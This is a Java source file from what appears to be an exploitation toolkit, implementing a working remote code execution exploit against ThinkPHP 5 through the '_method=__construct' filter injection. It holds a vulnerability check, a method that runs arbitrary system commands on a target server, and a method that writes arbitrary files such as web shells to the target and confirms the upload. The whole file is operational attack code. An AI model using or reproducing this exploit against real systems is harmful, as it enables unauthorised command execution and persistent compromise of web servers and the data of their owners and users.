package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_construct_debug_rce implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        url = url + "/index.php";
        String payload = "_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=dylan";
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(url, payload, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains("string(5) \"dylan\"")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String url = this.target + "/index.php";
        String payload = "_method=__construct&filter[]=system&server[REQUEST_METHOD]=" + cmd;
        this.headers.put("Content-type", "application/x-www-form-urlencoded");

        Response response = HttpTools.post(url, payload, this.headers, encoding);
        String results;
        if (response.getError() == null) {
            results = Tools.regReplace(response.getText());
        } else {
            results = response.getError();
        }

        return results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String fileContent, String fileName, String platform) throws Exception {
        String results = "";
        try {
            String base64Content = Base64.getEncoder().encodeToString(fileContent.getBytes(StandardCharsets.UTF_8));
            fileContent = URLEncoder.encode(base64Content, "UTF-8");
            String payload = "_method=__construct&filter[]=assert&server[REQUEST_METHOD]=file_put_contents('" + fileName + "',base64_decode('" + fileContent + "'))";

            this.headers.put("Content-type", "application/x-www-form-urlencoded");
            Response response = HttpTools.post(this.target + "/index.php?s=captcha", payload, this.headers, "UTF-8");
            if (response.getError() == null) {
                this.headers.clear();
                response = HttpTools.get(this.target + "/" + fileName, this.headers, "UTF-8");
                if (response.getCode() == 200) {
                    results = "[+] 上传成功，请检查URL：" + this.target + "/" + fileName;
                    return results;
                }
            } else {
                results = "[-] 上传失败: " + response.getError();
            }

        } catch (Exception var8) {
            results = "[-] 上传失败: " + var8.getMessage();
        }
        
        return results;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
